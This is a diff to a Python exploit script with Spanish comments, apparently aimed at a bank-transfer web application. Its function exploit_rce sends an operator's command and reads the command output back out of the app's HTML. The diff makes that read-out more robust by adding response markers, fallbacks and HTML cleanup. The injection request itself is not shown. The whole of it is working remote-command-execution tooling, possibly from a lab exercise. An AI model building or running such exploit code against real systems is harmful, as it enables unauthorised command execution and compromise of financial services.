@@ -11,6 +11,8 @@ en el sistema de transferencias bancarias.
 
 import requests
 from colorama import Fore, Style, init
+import html
+import re
 
 init(autoreset=True)
 
@@ -73,15 +75,49 @@ def exploit_rce(session, comando):
     
     if response.status_code == 200:
         # Extraer el resultado del HTML
-        if "Verificación de cuenta:" in response.text:
-            # Buscar el contenido entre las etiquetas
+        # Caso éxito: la app usa "Validación de cuenta destino:" como marcador
+        resultado = None
+        if "Validación de cuenta destino:" in response.text:
+            inicio = response.text.find("Validación de cuenta destino:") + len("Validación de cuenta destino:")
+            # Preferimos cortar antes de 'Estado:' si existe
+            fin = response.text.find("Estado:", inicio)
+            if fin == -1:
+                fin = response.text.find("Nota: Verifique el número", inicio)
+            if fin == -1:
+                fin = response.text.find("</pre>", inicio)
+            if fin == -1:
+                # intentar limitar al cierre del div.result-box
+                fin = response.text.find("</div>", inicio)
+            if fin == -1:
+                fin = len(response.text)
+
+            resultado = response.text[inicio:fin].strip()
+
+        # Caso error: la app usa "Verificación de cuenta:" como marcador
+        elif "Verificación de cuenta:" in response.text:
             inicio = response.text.find("Verificación de cuenta:") + len("Verificación de cuenta:")
             fin = response.text.find("Nota: Verifique el número", inicio)
             if fin == -1:
                 fin = response.text.find("</pre>", inicio)
-            
+            if fin == -1:
+                fin = response.text.find("</div>", inicio)
+            if fin == -1:
+                fin = len(response.text)
+
             resultado = response.text[inicio:fin].strip()
-            
+
+        # Fallback: intentar extraer el contenido del div.result-box (si existe)
+        else:
+            m = re.search(r"<div[^>]*class=\"result-box\"[^>]*>(.*?)</div>", response.text, re.S)
+            if m:
+                resultado = m.group(1).strip()
+
+        if resultado:
+            # Limpiar HTML escaped chars y eliminar tags HTML simples
+            resultado = html.unescape(resultado)
+            # Quitar etiquetas HTML si quedaron
+            resultado = re.sub(r'<[^>]+>', '', resultado).strip()
+
             print(f"{Fore.GREEN}{'='*60}")
             print(f"{Fore.GREEN}✓ COMANDO EJECUTADO EXITOSAMENTE{Style.RESET_ALL}\n")
             print(f"{Fore.CYAN}Salida:{Style.RESET_ALL}")
